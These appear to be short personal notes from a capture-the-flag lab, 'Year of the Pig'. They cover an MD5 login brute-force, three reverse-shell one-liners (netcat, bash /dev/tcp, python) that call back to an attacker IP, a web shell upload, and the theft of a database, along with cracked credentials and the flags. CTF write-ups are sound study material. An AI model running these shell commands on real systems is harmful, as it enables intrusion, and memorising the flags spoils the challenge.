### Year of the Pig ###

export IP=10.10.196.229


found an admin login page in which the password is hashed with md5 and then transmitted as post so trying a python script.

also the page looks like the flag of italy..

and also the a text which says:

''' Remember that passwords should be a memorable word, followed by two numbers and a special character '''

Made a whole python script to convert the passwd into md5 hashed and then pass it as a json request....also made a custom wordlist using cewl of the home page...with that hint in mind...brute forcing all possible combinations...


[~] Trying  savoia21!
[+] Found  marco:savoia21!

Found curtis as another user on the system

nc -e /bin/bash 10.11.18.102 6000

bash -i >& /dev/tcp/10.11.18.102/6000 0>&1

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.18.102",6000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

ssh'ed with same creds:

#Flag1.txt:
THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}

found an admin.db in /var/www's dir:

but i needed to be as www-data to access that.
so uploaded a rev shell in marco's home dir
and moved it to /var/www/html
accessed it through the browser
got a rev shell i was www-data.

fired up a python sv as www-data on the target url...
wgeted admin.db in my machine and found the passwd:

curtis:	Donald1983$

# Flag2.txt:
THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}


# Flag3.txt:
THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}